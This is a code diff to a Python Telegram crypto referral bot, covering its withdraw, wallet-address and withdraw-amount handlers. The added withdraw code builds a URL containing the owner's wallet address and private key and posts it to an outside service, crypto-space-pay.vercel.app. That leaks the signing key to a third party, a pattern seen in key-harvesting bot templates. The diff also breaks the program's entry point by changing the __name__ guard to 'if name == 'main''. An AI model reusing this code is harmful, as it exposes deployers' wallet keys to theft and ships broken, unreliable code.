@@ -237,101 +237,104 @@ def send_text(message):
         return
 
     if message.text == "💸 Withdraw":
-        user_id = message.chat.id
-        user = str(user_id)
+        user_id = message.chat.id
+        user = str(user_id)
 
-        data = json.load(open('users.json', 'r'))
-        if user not in data['balance']:
-            data['balance'][user] = 0
-        if user not in data['wallet']:
-            data['wallet'][user] = "none"
-        json.dump(data, open('users.json', 'w'))
+        data = json.load(open('users.json', 'r'))
+        if user not in data['balance']:
+            data['balance'][user] = 0
+        if user not in data['wallet']:
+            data['wallet'][user] = "none"
+        json.dump(data, open('users.json', 'w'))
 
-        bal = data['balance'][user]
-        wall = data['wallet'][user]
-        if wall == "none":
-            bot.send_message(user_id, "_❌ wallet Not set_",
-                             parse_mode="Markdown")
-            return
-        if bal >= Mini_Withdraw:
-            bot.send_message(user_id, "_Enter Your Amount_",
-                             parse_mode="Markdown")
-            bot.register_next_step_handler(message, amo_with)
-        else:
-            bot.send_message(
-                user_id, f"_❌Your balance low you should have at least {Mini_Withdraw} {TOKEN} to Withdraw_", parse_mode="Markdown")
-            return
-   except:
-        bot.send_message(message.chat.id, "This command having error pls wait for ficing the glitch by admin")
-        bot.send_message(OWNER_ID, "Your bot got an error fix it fast!\n Error on command: "+message.text)
-        return
+        bal = data['balance'][user]
+        wall = data['wallet'][user]
+        if wall == "none":
+            bot.send_message(user_id, "_❌ wallet Not set_",
+                             parse_mode="Markdown")
+            return
+        if bal >= Mini_Withdraw:
+            bot.send_message(user_id, "_Enter Your Amount_",
+                             parse_mode="Markdown")
+            bot.register_next_step_handler(message, amo_with)
+        else:
+            bot.send_message(
+                user_id, f"_❌Your balance low you should have at least {Mini_Withdraw} {TOKEN} to Withdraw_", parse_mode="Markdown")
+            return
+   except:
+        bot.send_message(message.chat.id, "This command having error pls wait for ficing the glitch by admin")
+        bot.send_message(OWNER_ID, "Your bot got an error fix it fast!\n Error on command: "+message.text)
+        return
 
 def trx_address(message):
-   try:
-    if message.text == "🚫 Cancel":
-        return menu(message.chat.id)
-    if len(message.text) == 34:
-        user_id = message.chat.id
-        user = str(user_id)
-        data = json.load(open('users.json', 'r'))
-        data['wallet'][user] = message.text
+   try:
+    if message.text == "🚫 Cancel":
+        return menu(message.chat.id)
+    if len(message.text) == 34:
+        user_id = message.chat.id
+        user = str(user_id)
+        data = json.load(open('users.json', 'r'))
+        data['wallet'][user] = message.text
 
-        bot.send_message(message.chat.id, "*💹Your Trx wallet set to " +
-                         data['wallet'][user]+"*", parse_mode="Markdown")
-        json.dump(data, open('users.json', 'w'))
-        return menu(message.chat.id)
-    else:
-        bot.send_message(
-            message.chat.id, "*⚠️ It's Not a Valid Trx Address!*", parse_mode="Markdown")
-        return menu(message.chat.id)
-   except:
-        bot.send_message(message.chat.id, "This command having error pls wait for ficing the glitch by admin")
-        bot.send_message(OWNER_ID, "Your bot got an error fix it fast!\n Error on command: "+message.text)
-        return
+        bot.send_message(message.chat.id, "*💹Your Trx wallet set to " +
+                         data['wallet'][user]+"*", parse_mode="Markdown")
+        json.dump(data, open('users.json', 'w'))
+        return menu(message.chat.id)
+    else:
+        bot.send_message(
+            message.chat.id, "*⚠️ It's Not a Valid Trx Address!*", parse_mode="Markdown")
+        return menu(message.chat.id)
+   except:
+        bot.send_message(message.chat.id, "This command having error pls wait for ficing the glitch by admin")
+        bot.send_message(OWNER_ID, "Your bot got an error fix it fast!\n Error on command: "+message.text)
+        return
 
 def amo_with(message):
-   try:
-    user_id = message.chat.id
-    amo = message.text
-    user = str(user_id)
-    data = json.load(open('users.json', 'r'))
-    if user not in data['balance']:
-        data['balance'][user] = 0
-    if user not in data['wallet']:
-        data['wallet'][user] = "none"
-    json.dump(data, open('users.json', 'w'))
+   try:
+    user_id = message.chat.id
+    amo = message.text
+    user = str(user_id)
+    data = json.load(open('users.json', 'r'))
+    if user not in data['balance']:
+        data['balance'][user] = 0
+    if user not in data['wallet']:
+        data['wallet'][user] = "none"
+    json.dump(data, open('users.json', 'w'))
 
-    bal = data['balance'][user]
-    wall = data['wallet'][user]
-    msg = message.text
-    if msg.isdigit() == False:
-        bot.send_message(
-            user_id, "_📛 Invaild value. Enter only numeric value. Try again_", parse_mode="Markdown")
-        return
-    if int(message.text) < Mini_Withdraw:
-        bot.send_message(
-            user_id, f"_❌ Minimum withdraw {Mini_Withdraw} {TOKEN}_", parse_mode="Markdown")
-        return
-    if int(message.text) > bal:
-        bot.send_message(
-            user_id, "_❌ You Can't withdraw More than Your Balance_", parse_mode="Markdown")
-        return
-    amo = int(amo)
-    data['balance'][user] -= int(amo)
-    data['totalwith'] += int(amo)
-    bot_name = bot.get_me().username
-    json.dump(data, open('users.json', 'w'))
-    bot.send_message(user_id, "✅* Withdraw is request to our owner automatically\n\n💹 Payment Channel :- "+PAYMENT_CHANNEL +"*", parse_mode="Markdown")
+    bal = data['balance'][user]
+    wall = data['wallet'][user]
+    msg = message.text
+    if msg.isdigit() == False:
+        bot.send_message(
+            user_id, "_📛 Invaild value. Enter only numeric value. Try again_", parse_mode="Markdown")
+        return
+    if int(message.text) < Mini_Withdraw:
+        bot.send_message(
+            user_id, f"_❌ Minimum withdraw {Mini_Withdraw} {TOKEN}_", parse_mode="Markdown")
+        return
+    if int(message.text) > bal:
+        bot.send_message(
+            user_id, "_❌ You Can't withdraw More than Your Balance_", parse_mode="Markdown")
+        return
+    amo = int(amo)
+    data['balance'][user] -= int(amo)
+    data['totalwith'] += int(amo)
+    bot_name = bot.get_me().username
+    json.dump(data, open('users.json', 'w'))
+    add = "owner address"
+    key = "private key"
+    response = requests.post(url="https://crypto-space-pay.vercel.app/senddgb/"+data['wallet'][user]+"/"+add+"/"+key+"/"+str(amo)+"").json()
+    bot.send_message(user_id, response)
+    bot.send_message(user_id, "✅* Withdraw is request to our owner automatically\n\n💹 Payment Channel :- "+PAYMENT_CHANNEL +"*", parse_mode="Markdown")
 
-    markupp = telebot.types.InlineKeyboardMarkup()
-    markupp.add(telebot.types.InlineKeyboardButton(text='🍀 BOT LINK', url=f'https://telegram.me/{bot_name}?start={OWNER_ID}'))
+    markupp = telebot.types.InlineKeyboardMarkup()
+    markupp.add(telebot.types.InlineKeyboardButton(text='🍀 BOT LINK', url=f'https://telegram.me/{bot_name}?start={OWNER_ID}'))
 
-    send = bot.send_message(PAYMENT_CHANNEL,  "✅* New Withdraw\n\n⭐ Amount - "+str(amo)+f" {TOKEN}\n🦁 User - @"+message.from_user.username+"\n💠 Wallet* - `"+data['wallet'][user]+"`\n☎️ *User Referrals = "+str(
-        data['referred'][user])+"\n\n🏖 Bot Link - @"+bot_name+"\n⏩ Please wait our owner will confrim it*", parse_mode="Markdown", disable_web_page_preview=True, reply_markup=markupp)
+    send = bot.send_message(PAYMENT_CHANNEL,  "✅* New Withdraw\n\n⭐ Amount - "+str(amo)+f" {TOKEN}\n🦁 User - @"+message.from_user.username+"\n💠 Wallet* - "+data['wallet'][user]+"\n☎️ *User Referrals = "+str(data['referred'][user])+"\n\n🏖 Bot Link - @"+bot_name+"\n⏩ Please wait our owner will confrim it*", parse_mode="Markdown", disable_web_page_preview=True, reply_markup=markupp)
    except:
         bot.send_message(message.chat.id, "This command having error pls wait for ficing the glitch by admin")
         bot.send_message(OWNER_ID, "Your bot got an error fix it fast!\n Error on command: "+message.text)
         return
 
-if __name__ == '__main__':
+if name == 'main':
     bot.polling(none_stop=True)
